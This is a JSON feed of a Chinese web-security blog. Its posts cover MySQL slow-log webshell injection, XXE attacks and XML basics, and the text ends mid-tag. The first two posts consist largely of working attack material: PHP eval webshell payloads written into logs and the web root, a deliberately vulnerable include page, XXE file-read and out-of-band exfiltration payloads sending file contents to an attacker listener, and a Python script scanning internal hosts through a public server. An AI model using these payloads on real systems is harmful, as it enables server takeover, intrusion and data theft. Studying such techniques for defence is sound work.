{
    "version": "https://jsonfeed.org/version/1",
    "title": "welcome to my blog",
    "description": "不定时更新web安全相关知识",
    "home_page_url": "https://hq185187.github.io",
    "items": [
        {
            "id": "https://hq185187.github.io/2023/07/06/%E6%85%A2%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/",
            "url": "https://hq185187.github.io/2023/07/06/%E6%85%A2%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5/",
            "title": "慢日志注入",
            "date_published": "2023-07-06T08:43:36.682Z",
            "content_html": "<h4 id=\"1-load_file读取函数\"><a class=\"markdownIt-Anchor\" href=\"#1-load_file读取函数\">#</a> 1 load_file (): 读取函数</h4>\n<p>MySQL：5.0.96<br>\n<img data-src=\"https://s2.loli.net/2023/07/06/Ok7pmWcXfoEA2TI.png\" alt=\"屏幕截图 2023-07-06 203810.png\"><br>\n%27 是引号</p>\n<h4 id=\"2文件写入\"><a class=\"markdownIt-Anchor\" href=\"#2文件写入\">#</a> 2. 文件写入</h4>\n<p>into outfile: 能写入多行，按格式输出<br>\n into dumpfile: 只能写入一行，没有输出格式<br>\n<img data-src=\"https://s2.loli.net/2023/07/06/bnKqk5r8yRWMumN.png\" alt=\"屏幕截图 2023-07-06 205301.png\"><br>\n<img data-src=\"https://s2.loli.net/2023/07/06/vIy8rDcaG9U5nwg.png\" alt=\"屏幕截图 2023-07-06 205603.png\"><br>\n 通过对比也可以看出两种方式的区别<br>\n dumpfile 没有输出格式，只能输出一行（这里没有体现）</p>\n<p>6.34 版本以后，secure_file_priv<br>\n 的值为 NULL, 并且无法用 SQL 语句对其修改<br>\n secure_file_priv 参数是用来限制 LOAD DATA,SELECT…INTO OUTFILE 语句和 LOAD_FILE () 函数等等<br>\n当它的值为空时，表示不限制 MySQL 的导入 / 导出<br>\n当它的值为 null 时，表示不允许 MySQL 导入导出</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show variables like &#x27;%secure_file_priv%&#x27;;</span><br></pre></td></tr></table></figure>\n<p>先本地连接 MySQL:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql.exe -u root -p</span><br><span class=\"line\">输入密码</span><br></pre></td></tr></table></figure>\n<p>当查询语句的时间超过系统默认的时间时，该语句会被记入慢查询日志。一般都是通过 long_query_time 选项设置，以秒为单位。查看默认的时间：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">show global variables like &#x27;%long_query_time%&#x27;;</span><br></pre></td></tr></table></figure>\n<p>我这里是 10s</p>\n<p>开启慢查询:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set global slow_query_log=1;</span><br></pre></td></tr></table></figure>\n<p>查看参数:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SHOW VARIABLES like &#x27;%slow_query_log%&#x27;;</span><br></pre></td></tr></table></figure>\n<p>此时如果有文件包含的点，我们可以 getshell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">$a=$_GET[&#x27;a&#x27;];</span><br><span class=\"line\"></span><br><span class=\"line\">$b=include($a);</span><br><span class=\"line\"></span><br><span class=\"line\">echo $b;</span><br></pre></td></tr></table></figure>\n<p>在 MySQL 命令行中，向日志文件写入 shell:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select &#x27;&lt;?php eval($_GET[X])?&gt;&#x27; or sleep(11);</span><br></pre></td></tr></table></figure>\n<p>直接 getshell:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/webtest/1.php?a=D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\laptop-slow.log&amp;X=phpinfo();</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://s2.loli.net/2023/07/06/Zs6HIdUKg2VFB8r.png\" alt=\"屏幕截图 2023-07-06 162417.png\"></p>\n<p>就算没有文件包含的点，我们也可以 getshell<br>\n 将日志文件位置改为能访问的文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SET GLOBAL slow_query_log_file=&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;;</span><br></pre></td></tr></table></figure>\n<p>此时在 MySQL 命令行添加 shell 日志<br>\n <code>select '&lt;?php eval($_GET[shell])?&gt;' or sleep(11);</code> <br>\n 直接可以在 shell.php 里面 getshell</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/07/06/xxe%E6%B3%A8%E5%85%A5/",
            "url": "https://hq185187.github.io/2023/07/06/xxe%E6%B3%A8%E5%85%A5/",
            "title": "XXE注入",
            "date_published": "2023-07-06T07:06:38.662Z",
            "content_html": "<p>XML 基础可以看这里<a href=\"https://hq185187.github.io/2023/07/06/XML%E5%9F%BA%E7%A1%80/\"> XMl</a></p>\n<h3 id=\"原理\"><a class=\"markdownIt-Anchor\" href=\"#原理\">#</a> 原理</h3>\n<p>发生在应用程序解析 XML 输入时没有禁止<mark>外部实体的加载</mark>，导致可加载恶意外部文件，造成文件读取，命令执行，内网端口扫描，攻击内网网站，发起 dos 攻击等。xxe 漏洞触发的点往往在可以上传 xml 文件的位置，没有对上传的 xml 文件进行过滤，导致可上传恶意 xml 文件</p>\n<p>simplexml_load_string () 是 PHP 的一个函数，<br>\nphp 文件：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$data</span> = <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"string\">&#x27;php://input&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$xml</span> = @<span class=\"title function_ invoke__\">simplexml_load_string</span>(<span class=\"variable\">$data</span>, <span class=\"string\">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$xml</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>外部实体:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>URL 中能写哪些类型的外部实体？<br>\n<img data-src=\"https://img-blog.csdnimg.cn/img_convert/5782d6c9d75646441930bebec4b15949.png\" alt=\"\"></p>\n<h3 id=\"检测\"><a class=\"markdownIt-Anchor\" href=\"#检测\">#</a> 检测</h3>\n<p>检测所有接受 XML 作为输入内容的端点，抓包观察结果<br>\n比如：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">ANY</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"keyword\">words</span> <span class=\"string\">&quot;Hello XXE !&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">root</span>&gt;</span><span class=\"symbol\">&amp;words;</span><span class=\"tag\">&lt;/<span class=\"name\">root</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"常见payload\"><a class=\"markdownIt-Anchor\" href=\"#常见payload\">#</a> 常见 payload：</h3>\n<h4 id=\"文件读取\"><a class=\"markdownIt-Anchor\" href=\"#文件读取\">#</a> 文件读取</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE xxe [</span><br><span class=\"line\">    &lt;!ELEMENT name ANY &gt;</span><br><span class=\"line\">    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/1.txt&quot; &gt;</span><br><span class=\"line\">]&gt;</span><br><span class=\"line\">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure>\n<p>当读取 PHP 文件肯定会报错，因为里面有 &lt; 这种字符，第一种方法是用 php 协议  <code>php://filter/read=convert.base64-encode/resource=</code> <br>\n 第二种方法是利用 CDATA，CDATA 部分的内容会被解析器忽略<br>\n远程 dtd 文件：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>本地 payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE roottag [</span><br><span class=\"line\">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;  </span><br><span class=\"line\">&lt;!ENTITY % goodies SYSTEM &quot;file:///D:/phpstudy_pro/WWW/zoe.php&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1/webtest/Note.dtd&quot;&gt; %dtd; ]&gt;&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://s2.loli.net/2023/07/06/jLReVOY7hsCqBIW.png\" alt=\"屏幕截图 2023-07-06 143408.png\"></p>\n<p>分析:<br>\n 先调用参数实体 % dtd, 来包含远程服务器的 dtd 文件，在调用通用实体 &amp; all, 此时会调用三个参数实体 % start;% goodies;% end; 从而达到将 php 文件的内容放在了 <code>&lt;![CDATA[ .. ]]&gt;</code>  中</p>\n<h4 id=\"外带\"><a class=\"markdownIt-Anchor\" href=\"#外带\">#</a> 外带</h4>\n<p>但是正常情况下，XML 文件都不是输出的，我们可以外带<br>\n kali:192.168.104.122<br>\nWindows:192.168.104.109<br>\nNote.dtd:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/1.txt&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://192.168.104.122:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>因为实体值不能有 %, 所以将其转成 html ( <code>&amp;#37;</code> )<br>\npayload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE convert [  </span><br><span class=\"line\">&lt;!ENTITY % remote SYSTEM &quot;http://192.168.104.109/webtest/Note.dtd&quot;&gt;%remote;%int;%send;]&gt;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://s2.loli.net/2023/07/05/TSGsJfZEwuiUYBz.png\" alt=\"屏幕截图 2023-07-05 224904.png\"><br>\n 分析:<br>\npayload 连续调用了三个参数实体，第一个调用 % remote; 可以访问远程服务器上的 Note.dtd 文件，相当于包含外部 dtd, 然后调用 % int; 会调用 Note.dtd 里的 % file; 它会获取服务器的敏感文件，将文件内容填入 % send 后面，最后调用 % send; 把数据发送到 kali 里</p>\n<h4 id=\"检测端口开放\"><a class=\"markdownIt-Anchor\" href=\"#检测端口开放\">#</a> 检测端口开放</h4>\n<p>比如 kali 的地址：192.168.104.122</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;http://192.168.104.122:233&quot; &gt;]&gt;</span><br><span class=\"line\">&lt;catalog&gt;&amp;xxe;</span><br><span class=\"line\">&lt;/catalog&gt;</span><br></pre></td></tr></table></figure>\n<p>出现 connection refused 就没开放，比较不同端口的回显可以看出，一般通过响应时间的长短判断是否开放</p>\n<p>此时 kali 命令行输入 nc -lvnp 233 会收到显示</p>\n<h4 id=\"内网主机探测\"><a class=\"markdownIt-Anchor\" href=\"#内网主机探测\">#</a> 内网主机探测</h4>\n<p>先用 file 协议看一下有无内网，以 Linux 为例，可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件<br>\n脚本:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import base64</span><br><span class=\"line\"></span><br><span class=\"line\">#Origtional XML that the server accepts</span><br><span class=\"line\">#&lt;xml&gt;</span><br><span class=\"line\">#    &lt;stuff&gt;user&lt;/stuff&gt;</span><br><span class=\"line\">#&lt;/xml&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def build_xml(string):</span><br><span class=\"line\">    xml = &quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br><span class=\"line\">    xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br><span class=\"line\">    xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#x27;&quot;&#x27; + string + &#x27;&quot;&#x27; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br><span class=\"line\">    xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br><span class=\"line\">    xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;&quot;&quot;&quot;</span><br><span class=\"line\">    xml = xml + &quot;\\r\\n&quot; + &quot;&quot;&quot;&lt;/xml&gt;&quot;&quot;&quot;</span><br><span class=\"line\">    send_xml(xml)</span><br><span class=\"line\"></span><br><span class=\"line\">def send_xml(xml):</span><br><span class=\"line\">    headers = &#123;&#x27;Content-Type&#x27;: &#x27;application/xml&#x27;&#125;</span><br><span class=\"line\">    x = requests.post(&#x27;http://34.200.157.128/CUSTOM/NEW_XEE.php&#x27;, data=xml, headers=headers, timeout=5).text</span><br><span class=\"line\">    coded_string = x.split(&#x27; &#x27;)[-2] # a little split to get only the base64 encoded value</span><br><span class=\"line\">    print coded_string</span><br><span class=\"line\">#   print base64.b64decode(coded_string)</span><br><span class=\"line\">for i in range(1, 255):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        i = str(i)</span><br><span class=\"line\">        ip = &#x27;10.0.0.&#x27; + i</span><br><span class=\"line\">        string = &#x27;php://filter/convert.base64-encode/resource=http://&#x27; + ip + &#x27;/&#x27;</span><br><span class=\"line\">        print string</span><br><span class=\"line\">        build_xml(string)</span><br><span class=\"line\">    except:</span><br><span class=\"line\">continue</span><br></pre></td></tr></table></figure>\n<p>工具 XXEinjector</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/07/06/XML%E5%9F%BA%E7%A1%80/",
            "url": "https://hq185187.github.io/2023/07/06/XML%E5%9F%BA%E7%A1%80/",
            "title": "XML基础知识",
            "date_published": "2023-07-06T07:05:34.714Z",
            "content_html": "<h3 id=\"简历\"><a class=\"markdownIt-Anchor\" href=\"#简历\">#</a> 简历</h3>\n<p>XML 被用来传输和存储数据，焦点是数据的内容，HTML 被用来显示数据，焦点是数据的外观<br>\n XML 标签没有被预定义，可以自定义标签<br>\n XML 不会做任何事情<br>\n XML 可以把数据从 HTML 中分离：当需要在 HTML 中显示动态数据时，将数据存储在独立的 XML，再通过几行 JavaScript 代码就可以读取一个外部 XML 文件，更新网页的数据内容</p>\n<h3 id=\"结构\"><a class=\"markdownIt-Anchor\" href=\"#结构\">#</a> 结构</h3>\n<p>XML 文档是一种树结构，它从根部开始，扩展到树叶<br>\n eg。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">to</span>&gt;</span>Tove<span class=\"tag\">&lt;/<span class=\"name\">to</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">from</span>&gt;</span>Jani<span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">heading</span>&gt;</span>Reminder<span class=\"tag\">&lt;/<span class=\"name\">heading</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>第一行是 XML 声明，下一行的 <code>&lt;note&gt;</code>  是文档的根元素，接下来描述根的四个子元素 (to,from,heading,body), 最后一行定义根元素的结尾 <code>&lt;/note&gt;</code></p>\n<p>XML 文档必须包含根元素，它是所有其他元素的父元素<br>\n它的结构大概是:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;root&gt;</span><br><span class=\"line\">&lt;child&gt;</span><br><span class=\"line\">&lt;subchild&gt;...&lt;/subchild&gt;</span><br><span class=\"line\">&lt;/child&gt;</span><br><span class=\"line\">&lt;/root&gt;</span><br></pre></td></tr></table></figure>\n<p>比如下面是上面代码的改良:</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">message1</span> <span class=\"attr\">category</span>=<span class=\"string\">&quot;english&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">to</span>&gt;</span>Tove<span class=\"tag\">&lt;/<span class=\"name\">to</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">from</span>&gt;</span>Jani<span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">heading</span>&gt;</span>Reminder<span class=\"tag\">&lt;/<span class=\"name\">heading</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">message1</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">message2</span> <span class=\"attr\">category</span>=<span class=\"string\">&quot;china&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">to</span>&gt;</span>李华<span class=\"tag\">&lt;/<span class=\"name\">to</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">from</span>&gt;</span>大明<span class=\"tag\">&lt;/<span class=\"name\">from</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">heading</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">heading</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span>this is a test!<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">message2</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">note</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"语法\"><a class=\"markdownIt-Anchor\" href=\"#语法\">#</a> 语法</h3>\n<ol>\n<li>XML 标签对大小写敏感， <code>&lt;Message&gt;</code>  与 <code>&lt;message&gt;</code>  是不一样的</li>\n<li>XML 必须正确嵌套 (标签闭合顺序)</li>\n<li>XML 的属性值必须加引号</li>\n<li>实体引用，&quot;&lt;&quot; 放在 XML 元素中会报错，解析器把它当作新元素的开始，有 5 个预定义的实体引用</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;lt;     &lt;     小于</span><br><span class=\"line\">&amp;gt;     &gt;     大于</span><br><span class=\"line\">&amp;amp;    &amp;     和号</span><br><span class=\"line\">&amp;apos;   &#x27;      单引号</span><br><span class=\"line\">&amp;quot;   &quot;      双引号</span><br></pre></td></tr></table></figure>\n<ol start=\"5\">\n<li>XML 的注释和 HTML 相似</li>\n</ol>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- --&gt;</span></span><br></pre></td></tr></table></figure>\n<ol start=\"6\">\n<li>XML 的空格会被保留，不会将多个空格合并为一个</li>\n<li>外部 DTD 文件引用:<br>\nNote.dtd</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE note</span><br><span class=\"line\"></span><br><span class=\"line\">[</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!ELEMENT body (#PCDATA)&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">]&gt;</span><br></pre></td></tr></table></figure>\n<p>test.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span> encoding=<span class=\"string\">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">note</span> <span class=\"keyword\">SYSTEM</span> <span class=\"string\">&quot;Note.dtd&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">note</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">to</span>&gt;</span>Tove<span class=\"tag\">&lt;/<span class=\"name\">to</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span 